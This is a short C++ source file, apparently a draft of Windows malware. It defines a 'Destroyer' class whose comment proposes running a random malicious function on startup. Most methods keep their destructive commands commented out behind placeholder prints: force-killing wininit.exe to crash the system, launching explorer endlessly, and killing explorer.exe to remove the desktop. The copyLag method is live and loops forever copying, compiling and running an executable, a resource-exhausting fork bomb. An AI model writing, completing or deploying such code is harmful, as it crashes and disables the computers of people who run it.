#include <iostream>

/**Making an object "Destroyer", which will contain all the necessary functions. I think we should make 
 * it so that a random malicious function is called upon startup 
**/ 
class Destroyer{
    public:
        void bsod()//BSODs the computer
        {
        //system("taskkill /IM \"wininit.exe\" /F");
        std :: cout << "This is a placeholder\n";
        }

        void overflow()//Opens explorer infinite times crashing the system 
        {
            while (true)
            {
                //system("explorer");
                std :: cout << "Normally ur pc would be dead\n"; 
            }
        }

        void killUI() //ends explorer task, hence destroying the ui of windows 10
        {
            //system("taskkill /IM \"explorer.exe\" /F");
            std :: cout << "Your UI would disappear normally\n";
        }

        void copyLag()
        {
            while (true)
            {
                system("copy lag.h");
                system("gcc lag.h -o lag.exe");
                system("lag.exe");
            }
        }
};
